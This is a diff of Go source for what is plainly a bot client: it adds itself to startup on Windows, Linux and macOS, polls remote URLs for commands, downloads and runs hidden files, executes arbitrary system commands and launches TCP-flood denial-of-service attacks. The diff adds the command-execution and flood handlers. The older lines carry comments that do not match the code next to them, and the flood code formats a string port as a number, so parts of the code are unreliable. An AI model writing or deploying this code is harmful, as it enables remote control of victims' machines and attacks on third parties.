@@ -1,35 +1,24 @@
-// Package declaration
 package main
 
-// TODO: keep comments updated
-// TODO: do testing on linux
-// TODO: do testing on linux with admin privileges
-// TODO: do testing on darwin
-// TODO: do testing on darwin with admin privileges
-// TODO: do testing on windows
-// TODO: do testing on windows with admin privileges
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"math/rand"
 	"net"
-	// Import statements to include necessary packages
 	"net/http"
 	"os"
-	// Function to check if the program is running with administrative privileges on Windows
 	"os/exec"
 	"path/filepath"
 	"runtime"
 	"strings"
 	"sync"
-	// Function to copy a file from a source path (src) to a destination path (dst)
 	"time"
 )
 
-// DONE: add linux and darwin support
-
+// isAdmin checks if the current user has admin privileges
 func isAdmin() (bool, error) {
 	switch runtime.GOOS {
 	case "windows":
@@ -51,21 +40,22 @@ func isAdmin() (bool, error) {
 	}
 }
 
+// copyFile copies a file from src to dst
 func copyFile(src, dst string) error {
 	input, err := os.ReadFile(src)
 	if err != nil {
 		return err
 	}
 
-	// Checks if the program is running with administrative privileges and sets the startup path accordingly
 	err = os.WriteFile(dst, input, 0644)
 	return err
 }
 
-// DONE: make it check if the file exists to make it non repetitive
-func AutostartOnWindows(executablePath string) {
+// AutostartOnWin adds the executable to the Windows startup folder
+func AutostartOnWin(executablePath string) {
 	var startupPath string
 	admin, err := isAdmin()
+
 	if err != nil {
 		fmt.Println("Error checking admin privileges:", err)
 		return
@@ -79,22 +69,16 @@ func AutostartOnWindows(executablePath string) {
 
 	destPath := filepath.Join(startupPath, filepath.Base(executablePath))
 
-	// Check if the file already exists
-	if _, err := os.Stat(destPath); err == nil {
-		fmt.Println("File already exists in startup folder:", destPath)
-		return
-	}
-
 	err = copyFile(executablePath, destPath)
 	if err != nil {
 		fmt.Println("Error copying file:", err)
 	} else {
+
 		fmt.Println("Successfully copied to startup folder:", destPath)
 	}
 }
 
-// DONE: actually make it autostart on linux and darwin
-// TODO: make it check if the file exists to make it non repetitive
+// autostartOnLinuxAndDarwin adds the executable to the autostart directory on Linux and Darwin
 func autostartOnLinuxAndDarwin(executablePath string) {
 	var autostartDir string
 	admin, err := isAdmin()
@@ -128,20 +112,15 @@ func autostartOnLinuxAndDarwin(executablePath string) {
 	}
 
 	destPath := filepath.Join(autostartDir, filepath.Base(executablePath))
-
-	// Check if the file already exists
-	if _, err := os.Stat(destPath); err == nil {
-		fmt.Println("File already exists in autostart directory:", destPath)
-		return
-	}
-
-	err = copyFile(executablePath, destPath)
+	err = os.Symlink(executablePath, destPath)
 	if err != nil {
-		fmt.Println("Error copying file to autostart directory:", err)
+		fmt.Println("Error creating symlink in autostart directory:", err)
 	} else {
 		fmt.Println("Successfully added to autostart:", destPath)
 	}
 }
+
+// runAtStartup adds the executable to the autostart directory depending on the OS
 func runAtStartup() {
 	executable, err := os.Executable()
 	if err != nil {
@@ -150,19 +129,21 @@ func runAtStartup() {
 	}
 
 	if runtime.GOOS == "windows" {
-		AutostartOnWindows(executable)
+		AutostartOnWin(executable)
 	} else {
 		autostartOnLinuxAndDarwin(executable)
 	}
 }
 
+// Config holds the configuration for the program
 type Config struct {
 	URL        string   `json:"url"`
 	BackupURLs []string `json:"backups"`
+	WebhookURL string   `json:"webhookURL"`
 }
-
+// downloadFile downloads a file from a URL and saves it to a local file
 func downloadFile(url, filename string, run, hide bool) error {
-	// Writes the downloaded content to a file
+
 	resp, err := http.Get(url)
 	if err != nil {
 		return err
@@ -171,7 +152,7 @@ func downloadFile(url, filename string, run, hide bool) error {
 
 	if resp.StatusCode != http.StatusOK {
 		return fmt.Errorf("HTTP request failed with status code %d", resp.StatusCode)
-		// Optionally hides the file on the filesystem
+
 	}
 
 	out, err := os.Create(filename)
@@ -182,7 +163,7 @@ func downloadFile(url, filename string, run, hide bool) error {
 
 	_, err = io.Copy(out, resp.Body)
 	if err != nil {
-		// Optionally runs the downloaded file
+
 		return err
 	}
 
@@ -195,7 +176,7 @@ func downloadFile(url, filename string, run, hide bool) error {
 		} else {
 			hiddenFilename := "." + filename
 			err := os.Rename(filename, hiddenFilename)
-			// Function to display a message in a temporary HTML file and open it in a browser
+
 			if err != nil {
 				return fmt.Errorf("failed to rename the file: %v", err)
 			}
@@ -210,36 +191,39 @@ func downloadFile(url, filename string, run, hide bool) error {
 			os.Chmod(filename, 0755)
 			cmd = exec.Command("./" + filename)
 		}
-		// Function to open the temporary HTML file in the default web browser
+
 		cmd.Run()
 	}
 
 	return nil
 }
 
+// displayMessageInHTML creates a temporary HTML file and displays a message in it
 func displayMessageInHTML(message string) {
-
+	// Create a temporary file
 	tmpfile, err := ioutil.TempFile("", "message-*.html")
-	// Function to load the configuration from a JSON file
 	if err != nil {
 		fmt.Printf("Error creating a temporary file: %s\n", err)
 		return
 	}
 	defer tmpfile.Close()
 
+	// Write the HTML content to the file
 	htmlContent := fmt.Sprintf("<html><body><p>%s</p></body></html>", message)
 	if _, err := tmpfile.Write([]byte(htmlContent)); err != nil {
 		fmt.Printf("Error writing to temporary file: %s\n", err)
 		return
 	}
 
+	// Open the temporary file in the browser
 	openBrowser(tmpfile.Name())
 }
 
-// Function to fetch a command from a list of URLs provided in the Config struct
+// openBrowser opens a URL in the default browser
 func openBrowser(url string) {
 	var err error
 
+	// Open the URL in the browser based on the operating system
 	switch runtime.GOOS {
 	case "linux":
 		err = exec.Command("xdg-open", url).Start()
@@ -253,19 +237,20 @@ func openBrowser(url string) {
 
 	if err != nil {
 		fmt.Printf("Error opening browser: %s\n", err)
-		// Function to generate a random string of a specified length
 	}
 }
 
+// LoadConfig loads the configuration from a JSON file
 func LoadConfig(path string) (*Config, error) {
+	// Open the JSON file
 	file, err := os.Open(path)
 	if err != nil {
 		return nil, err
 	}
 	defer file.Close()
 
+	// Decode the JSON file into a Config struct
 	var config Config
-	// Function to perform a Denial of Service (DoS) attack on a specified target and port for a duration
 	decoder := json.NewDecoder(file)
 	err = decoder.Decode(&config)
 	if err != nil {
@@ -275,14 +260,17 @@ func LoadConfig(path string) (*Config, error) {
 	return &config, nil
 }
 
+// FetchCommand fetches a command from a URL
 func FetchCommand(config *Config) (string, error) {
+	// Try each URL until one succeeds
 	urls := append([]string{config.URL}, config.BackupURLs...)
 	for _, url := range urls {
 		resp, err := http.Get(url + "?nocache=" + generateRandomString(20))
 		if err == nil && resp.StatusCode == http.StatusOK {
+			// Read the response body
 			body, err := ioutil.ReadAll(resp.Body)
 			resp.Body.Close()
-			// Function to parse and execute commands received as strings
+
 			if err != nil {
 				continue
 			}
@@ -292,6 +280,7 @@ func FetchCommand(config *Config) (string, error) {
 	return "", fmt.Errorf("all URLs failed")
 }
 
+// generateRandomString generates a random string of a given length
 func generateRandomString(length int) string {
 	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	b := make([]byte, length)
@@ -300,17 +289,20 @@ func generateRandomString(length int) string {
 	}
 	return string(b)
 }
+
+// DOS performs a Denial of Service attack on a target
 func DOS(target string, port string, duration time.Duration) {
+	// Calculate the end time of the attack
 	endTime := time.Now().Add(duration)
 	var wg sync.WaitGroup
 
+	// Define the function to send a request
 	send := func() {
 		defer wg.Done()
 		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
 		if err != nil {
 			fmt.Println(err)
 			return
-			// Function to execute a system command with the provided name and arguments
 		}
 		defer conn.Close()
 
@@ -321,27 +313,42 @@ func DOS(target string, port string, duration time.Duration) {
 		}
 	}
 
+	// Send requests until the end time
 	for time.Now().Before(endTime) {
 		wg.Add(1)
 		go send()
-		// The main function, entry point of the program
+
 		time.Sleep(10 * time.Millisecond)
 	}
-	// Sets the seed for the random number generator
 
 	wg.Wait()
-	// Loads configuration from a file
 }
 
+// executeSystemCommand executes a system command and returns its output
+func executeSystemCommand(name string, args []string) (string, error) {
+	// Execute the command
+	cmd := exec.Command(name, args...)
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	err := cmd.Run()
+	if err != nil {
+		return "", fmt.Errorf("Error executing command '%s': %s\n", name, err)
+	}
+	return out.String(), nil
+}
+
+// ParseCommand parses a command and performs the corresponding action
 func ParseCommand(command string) error {
+	// Split the command into lines
 	commands := strings.Split(command, "\n")
 	for _, cmd := range commands {
+		// Split the line into words
 		parts := strings.Fields(cmd)
 		if len(parts) == 0 {
-			// Infinite loop to fetch and execute commands at a regular interval
 			continue
 		}
 
+		// Perform the action based on the first word
 		switch parts[0] {
 		case "popmsg":
 			if len(parts) > 1 {
@@ -371,7 +378,33 @@ func ParseCommand(command string) error {
 			} else {
 				fmt.Println("Invalid download command. Usage: download [url] [filename] [RUN] [HIDE]")
 			}
+		case "cmd":
+			if len(parts) > 1 {
+				_, err := executeSystemCommand(parts[1], parts[2:])
+				if err != nil {
+					fmt.Println(err)
+				} else {
 
+				}
+			} else {
+				fmt.Println("Invalid cmd command. Usage: cmd [command] [args...]")
+			}
+		case "dos":
+			if len(parts) < 4 {
+				fmt.Println("Invalid dos command. Usage: dos <IP/domain> <port> <duration>")
+			} else {
+				target := parts[1]
+				port := parts[2]
+				durationStr := parts[3]
+
+				duration, err := time.ParseDuration(durationStr)
+				if err != nil {
+					fmt.Printf("Invalid duration: %s\n", durationStr)
+					continue
+				}
+
+				DOS(target, port, duration)
+			}
 		default:
 			if strings.HasPrefix(cmd, "dos ") {
 				info := strings.TrimSpace(strings.TrimPrefix(cmd, "dos "))
@@ -397,28 +430,20 @@ func ParseCommand(command string) error {
 	return nil
 }
 
-func executeSystemCommand(name string, args []string) {
-	cmd := exec.Command(name, args...)
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-	err := cmd.Run()
-	if err != nil {
-		fmt.Printf("Error executing command '%s': %s\n", name, err)
-	}
-}
-
+// main is the entry point of the program
 func main() {
 	fmt.Println("Starting program...")
 	rand.Seed(time.Now().UnixNano())
 
+	// Load the configuration
 	config, err := LoadConfig("config.json")
 	if err != nil {
 		fmt.Printf("Error loading config: %s\n", err)
 		os.Exit(1)
 	}
 
+	// Continuously fetch and parse commands
 	for {
-
 		command, err := FetchCommand(config)
 		if err != nil {
 			fmt.Printf("Error fetching command: %s\n", err)
